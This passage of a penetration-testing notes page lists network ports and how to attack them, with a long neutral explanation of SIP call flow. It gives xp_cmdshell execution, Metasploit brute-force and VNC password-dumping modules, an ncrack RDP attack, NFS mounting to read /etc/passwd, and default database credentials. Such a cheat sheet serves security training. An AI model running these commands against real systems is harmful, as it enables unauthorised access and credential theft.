+<p>Default port for Microsoft SQL .</p>
+<pre><code>sqsh -S 192.168.1.101 -U sa
+</code></pre>
+
+<h1 id="execute-commands">Execute commands<a class="headerlink" href="#execute-commands" title="Permanent link">#</a></h1>
+<pre><code class="bash"># To execute the date command to the following after logging in
+xp_cmdshell 'date'
+go
+</code></pre>
+
+<p>Many o the scanning modules in metasploit requires authentication. But some do not.</p>
+<pre><code>use auxiliary/scanner/mssql/mssql_ping
+</code></pre>
+
+<h3 id="brute-force">Brute force.<a class="headerlink" href="#brute-force" title="Permanent link">#</a></h3>
+<pre><code>scanner/mssql/mssql_login
+</code></pre>
+
+<p>If you have credencials look in metasploit for other modules.</p>
+<h2 id="port-1521-oracle-database">Port 1521 - Oracle database<a class="headerlink" href="#port-1521-oracle-database" title="Permanent link">#</a></h2>
+<p>Enumeration</p>
+<pre><code>tnscmd10g version -h 192.168.1.101
+tnscmd10g status -h 192.168.1.101
+</code></pre>
+
+<p>Bruteforce the ISD</p>
+<pre><code>auxiliary/scanner/oracle/sid_brute
+</code></pre>
+
+<p>Connect to the database with <code>sqlplus</code></p>
+<p>References:</p>
+<p>http://www.red-database-security.com/wp/itu2007.pdf</p>
+<h2 id="ports-1748-1754-1808-1809-oracle">Ports 1748, 1754, 1808, 1809 - Oracle<a class="headerlink" href="#ports-1748-1754-1808-1809-oracle" title="Permanent link">#</a></h2>
+<p>These are also ports used by oracle on windows. They run Oracles <strong>Intelligent Agent</strong>.</p>
+<h2 id="port-2049-nfs">Port 2049 - NFS<a class="headerlink" href="#port-2049-nfs" title="Permanent link">#</a></h2>
+<p>Network file system
+This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.</p>
+<p>If the service is on its default port you can run this command to see what the filesystem is sharing</p>
+<pre><code>showmount -e 192.168.1.109
+</code></pre>
+
+<p>Then you can mount the filesystem to your machine using the following command</p>
+<pre><code>mount 192.168.1.109:/ /tmp/NFS
+mount -t 192.168.1.109:/ /tmp/NFS
+</code></pre>
+
+<p>Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.</p>
+<p>This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.</p>
+<h2 id="port-2100-oracle-xml-db">Port 2100 - Oracle XML DB<a class="headerlink" href="#port-2100-oracle-xml-db" title="Permanent link">#</a></h2>
+<p>There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it. </p>
+<p>Can be accessed through ftp.
+Some default passwords here: 
+https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
+Name: 
+Version:</p>
+<p>Default logins:
+sys:sys
+scott:tiger</p>
+<h2 id="port-3268-globalcatldap">Port 3268 - globalcatLdap<a class="headerlink" href="#port-3268-globalcatldap" title="Permanent link">#</a></h2>
+<h2 id="port-3306-mysql">Port 3306 - MySQL<a class="headerlink" href="#port-3306-mysql" title="Permanent link">#</a></h2>
+<p>Always test the following:</p>
+<p>Username: root</p>
+<p>Password: root</p>
+<pre><code>mysql --host=192.168.1.101 -u root -p
+mysql -h &lt;Hostname&gt; -u root
+mysql -h &lt;Hostname&gt; -u root@localhost
+mysql -h &lt;Hostname&gt; -u &quot;&quot;@localhost
+
+telnet 192.168.0.101 3306
+</code></pre>
+
+<p>You will most likely see this a lot:</p>
+<pre><code>ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
+</code></pre>
+
+<p>This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.</p>
+<h3 id="configuration-files">Configuration files<a class="headerlink" href="#configuration-files" title="Permanent link">#</a></h3>
+<pre><code>cat /etc/my.cnf
+</code></pre>
+
+<p>http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html</p>
+<h3 id="mysql-commands-cheat-sheet">Mysql-commands cheat sheet<a class="headerlink" href="#mysql-commands-cheat-sheet" title="Permanent link">#</a></h3>
+<p>http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html</p>
+<h3 id="uploading-a-shell">Uploading a shell<a class="headerlink" href="#uploading-a-shell" title="Permanent link">#</a></h3>
+<p>You can also use mysql to upload a shell</p>
+<h3 id="escalating-privileges">Escalating privileges<a class="headerlink" href="#escalating-privileges" title="Permanent link">#</a></h3>
+<p>If mysql is started as root you might have a chance to use it as a way to escalate your privileges.</p>
+<h4 id="mysql-udf-injection">MYSQL UDF INJECTION:<a class="headerlink" href="#mysql-udf-injection" title="Permanent link">#</a></h4>
+<p>https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</p>
+<h3 id="finding-passwords-to-mysql">Finding passwords to mysql<a class="headerlink" href="#finding-passwords-to-mysql" title="Permanent link">#</a></h3>
+<p>You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?</p>
+<p>So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:</p>
+<pre><code>/var/www/html/configuration.php
+</code></pre>
+
+<p>In that file you find the </p>
+<pre><code class="php">&lt;?php
+class JConfig {
+var $mailfrom = 'admin@example.com';
+var $fromname = 'testuser';
+var $sendmail = '/usr/sbin/sendmail';
+var $password = 'myPassowrd1234';
+var $sitename = 'test';
+var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
+var $MetaKeys = 'joomla, Joomla';
+var $offline_message = 'This site is down for maintenance. Please check back again soon.';
+}
+</code></pre>
+
+<h2 id="port-3339-oracle-web-interface">Port 3339 - Oracle web interface<a class="headerlink" href="#port-3339-oracle-web-interface" title="Permanent link">#</a></h2>
+<h2 id="port-3389-remote-desktop-protocol">Port 3389 - Remote Desktop Protocol<a class="headerlink" href="#port-3389-remote-desktop-protocol" title="Permanent link">#</a></h2>
+<p>This is a proprietary protocol developed by windows to allow remote desktop.</p>
+<p>Log in like this</p>
+<pre><code>rdesktop -u guest -p guest 10.11.1.5 -g 94%
+</code></pre>
+
+<p>Brute force like this</p>
+<pre><code>ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
+</code></pre>
+
+<h3 id="ms12-020">Ms12-020<a class="headerlink" href="#ms12-020" title="Permanent link">#</a></h3>
+<p>This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit. </p>
+<h2 id="port-4445-upnotifyp">Port 4445 - Upnotifyp<a class="headerlink" href="#port-4445-upnotifyp" title="Permanent link">#</a></h2>
+<p>I have not found anything here. Try connecting with netcat and visiting in browser.</p>
+<h2 id="port-4555-rsip">Port 4555 - RSIP<a class="headerlink" href="#port-4555-rsip" title="Permanent link">#</a></h2>
+<p>I have seen this port being used by Apache James Remote Configuration. </p>
+<p>There is an exploit for version 2.3.2</p>
+<p>https://www.exploit-db.com/docs/40123.pdf</p>
+<h2 id="5060-5061-sip">5060 / 5061 - SIP<a class="headerlink" href="#5060-5061-sip" title="Permanent link">#</a></h2>
+<ul>
+<li>PBX - Public branch exchange</li>
+</ul>
+<p>A private phone exchange, usually found inside a company for example.</p>
+<ul>
+<li>Trunk - Connects a PBX with the rest of the telephone-network.</li>
+</ul>
+<p>Lync is being rebranded to Skype for business. So today it is basically the same thing.</p>
+<p>Asterix is a software implementation of a PBX.</p>
+<p>Session Initiation Protocol (SIP).
+SIP V 2.0 is standardized in RFC 3261:  https://tools.ietf.org/html/rfc3261. It has since then changed a bit in other RFCs.
+SIP communicates over TCP/UDP and SCTP. It uses port 5060 for unencrypted traffic and 5061 for encrypted.</p>
+<p>SIP is just phones over the IP network.
+- A Client is usually called a <code>SIP User Agent</code>. In order for one user agent to call another both need to listen on their ports, usually 5060 or 5061.
+However, how would one user that is trying to call another user know at which IP address that user is at?</p>
+<h3 id="flow-of-a-call-within-a-domain">Flow of a call within a domain<a class="headerlink" href="#flow-of-a-call-within-a-domain" title="Permanent link">#</a></h3>
+<p><strong>Step 1. Register</strong></p>
+<p>So the first step for a client is to send the above mentioned registration data to the registrar.
+So lets say that both our callers boot up their sip-phones. On boot they send their AOR and ip address to the registrar</p>
+<p>It works like this. When a user boot up its phone/client, that client will send a message to the <code>Registrar</code>. The message contains the device Address of Record (AOA).
+The AOR has this format: <code>SIP:user@domain</code>. And the client will also send its contact address, ie its ip address. So it will send it like this:
+<code>sip:1003@company.com sip:192.168.11.1:5060</code></p>
+<p><strong>Step 2. Invitation</strong>
+So when the userA wants to call userB, he sends an <code>INVITE</code> to the <code>LOCATION</code> service, which knows the ip address of userB. So it proxies the call to the userB.</p>
+<p><strong>Step 3. Response</strong>
+UserB picks up the phone, and his ip-address is sent through the <code>LOCATION</code> service, to UserA. So now userA has userB:s ip address.</p>
+<p>So the fundamental components here are:
+Registrar service
+SIP registry (the database with the clients info)
+Location Service</p>
+<h3 id="flow-of-a-call-outside-of-the-domain">Flow of a call outside of the domain<a class="headerlink" href="#flow-of-a-call-outside-of-the-domain" title="Permanent link">#</a></h3>
+<p>So the client registrar his AOR to his local SIP server.
+The SIP server, or SIP proxy, looks up the AOR for the recipient, but can't find it. So it looks at the domain: 1999@othercompany.se
+So it performs a lookup to othercompany.se, finds the ip-adress and the direct the INVITE to that server.</p>
+<h3 id="calling-a-non-ip-phone">Calling a non-ip phone<a class="headerlink" href="#calling-a-non-ip-phone" title="Permanent link">#</a></h3>
+<p>So is it possible to call a non-ip phone? Yes.
+For that you can use a Signalling gateway. Signall protocol translator. Example of those are SS7.
+But you need a a translator, that translates from SIP to Public switched telephone netowkr (PSTN).</p>
+<h3 id="protocol-level-analysis">Protocol level analysis<a class="headerlink" href="#protocol-level-analysis" title="Permanent link">#</a></h3>
+<p>So, let's look at exchange between two user agents/client.
+This is a scenario where they are on the same network and know each others ip.</p>
+<pre><code>ALICE is calling BOB.
+ALice INVITE ----&gt;      BOB
+Alice &lt;---- 100 Trying  BOB
+Alice &lt;---- 180 Ringing BOB
+Alice &lt;---- 200 OK      BOB
+Alice ACK ----&gt;         BOB
+
+ALICE DATA &lt;-----&gt; DATA BOB 
+
+Alice hangs up
+Alice BYE ----&gt;         BOB
+Alice &lt;---- 200 OK      BOB
+</code></pre>
+
+<h2 id="port-5357-wsdapi">Port 5357 - WSDAPI<a class="headerlink" href="#port-5357-wsdapi" title="Permanent link">#</a></h2>
+<h2 id="port-5722-dfsr">Port 5722 - DFSR<a class="headerlink" href="#port-5722-dfsr" title="Permanent link">#</a></h2>
+<blockquote>
+<p>The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.</p>
+</blockquote>
+<p>I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller. </p>
+<h2 id="port-5900-vnc">Port 5900 - VNC<a class="headerlink" href="#port-5900-vnc" title="Permanent link">#</a></h2>
+<p>VNC is used to get a screen for a remote host. But some of them have some exploits.</p>
+<p>You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.</p>
+<p>It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords</p>
+<pre><code>background
+use post/windows/gather/credentials/vnc
+set session X
+exploit
+</code></pre>
+
+<pre><code>vncviewer 192.168.1.109
+</code></pre>
+
+<h3 id="ctr-alt-del">Ctr-alt-del<a class="headerlink" href="#ctr-alt-del" title="Permanent link">#</a></h3>
+<p>If you are unable to input ctr-alt-del (kali might interpret it as input for kali).</p>
+<p>Try <code>shift-ctr-alt-del</code></p>
+<h3 id="metasploit-scanner">Metasploit scanner<a class="headerlink" href="#metasploit-scanner" title="Permanent link">#</a></h3>
+<p>You can scan VNC for logins, with bruteforce. </p>
+<p><strong>Login scan</strong></p>
+<pre><code>use auxiliary/scanner/vnc/vnc_login
+set rhosts 192.168.1.109
+run
+</code></pre>
+
+<p><strong>Scan for no-auth</strong></p>
+<pre><code>use auxiliary/scanner/vnc/vnc_none_auth
+set rhosts 192.168.1.109
+run
+</code></pre>
+
+<h2 id="port-8080">Port 8080<a class="headerlink" href="#port-8080" title="Permanent link">#</a></h2>
+<p>Since this port is used by many different services. They are divided like this.</p>
+<h3 id="tomcat">Tomcat<a class="headerlink" href="#tomcat" title="Permanent link">#</a></h3>
+<p>Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.</p>
+<h2 id="port-9389-">Port 9389 -<a class="headerlink" href="#port-9389-" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_active_directory_domain/good_to_know/active_directory_help_commands/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_active_directory_domain/good_to_know/active_directory_help_commands/" class="btn btn-xs btn-link">
+        Helpful Commands and Scripts
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../attacking_external_network/attacking_external_networks/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../attacking_external_network/attacking_external_networks/" class="btn btn-xs btn-link">
+        Attacking External Networks
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_internal_network/list_of_common_ports.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
